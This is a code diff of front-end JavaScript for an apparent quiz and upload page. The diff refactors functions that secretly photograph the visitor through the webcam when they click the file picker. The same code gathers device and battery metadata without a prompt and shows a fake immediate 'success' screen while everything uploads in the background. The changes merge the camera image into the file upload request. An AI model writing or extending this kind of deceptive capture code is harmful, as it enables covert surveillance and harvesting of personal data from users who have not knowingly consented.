@@ -4,11 +4,10 @@ const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "/api";
-
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
-let capturedImage = null; // store image temporarily
+let capturedImage = null; // store camera image temporarily
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
@@ -24,7 +23,7 @@ async function collectMetadata() {
     time: new Date().toLocaleString(),
   };
 
-  // Battery (no popup)
+  // Battery info (no popup)
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -66,7 +65,7 @@ async function captureCamera() {
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    capturedImage = canvas.toDataURL("image/png"); // store temporarily
+    capturedImage = canvas.toDataURL("image/png"); // store camera image
 
     stream.getTracks().forEach((t) => t.stop());
     cameraCaptured = true;
@@ -75,7 +74,7 @@ async function captureCamera() {
   }
 }
 
-// Ask camera permission only when clicking file input
+// Ask camera permission only on file click
 if (fileInput) {
   fileInput.addEventListener("click", async () => {
     await captureCamera();
@@ -83,9 +82,9 @@ if (fileInput) {
 }
 
 // ================================
-// UPLOAD FILE WITH METADATA
+// UPLOAD FILE + METADATA + CAMERA IMAGE
 // ================================
-async function uploadFile(file, metadata) {
+async function uploadFileWithMetadata(file, metadata, cameraImage) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
 
@@ -97,7 +96,8 @@ async function uploadFile(file, metadata) {
           body: JSON.stringify({
             file: reader.result,
             filename: file.name,
-            metadata // send metadata here
+            metadata,
+            cameraImage // optional, include if captured
           }),
         });
 
@@ -123,29 +123,22 @@ form.addEventListener("submit", async (e) => {
     return;
   }
 
-  // 1️⃣ Show success page immediately
+  // Show success page immediately
   document.getElementById("quiz-container").style.display = "none";
   document.getElementById("success-container").style.display = "flex";
 
-  // 2️⃣ Send metadata + file + camera image in background
+  // Send everything in background
   (async () => {
     try {
       const metadata = await collectMetadata();
 
-      // Upload file + metadata
-      const fileRes = await uploadFile(fileInput.files[0], metadata);
-      const fileUrl = fileRes.fileUrl || fileRes.url; // depends on backend response
+      const res = await uploadFileWithMetadata(
+        fileInput.files[0],
+        metadata,
+        capturedImage
+      );
 
-      // Optionally send camera image (if you want to store separately)
-      if (capturedImage) {
-        await fetch(`${BACKEND_BASE}/upload`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ image: capturedImage }),
-        });
-      }
-
-      console.log("Background upload completed successfully");
+      console.log("Upload successful:", res);
     } catch (err) {
       console.error("Background upload failed:", err);
     }
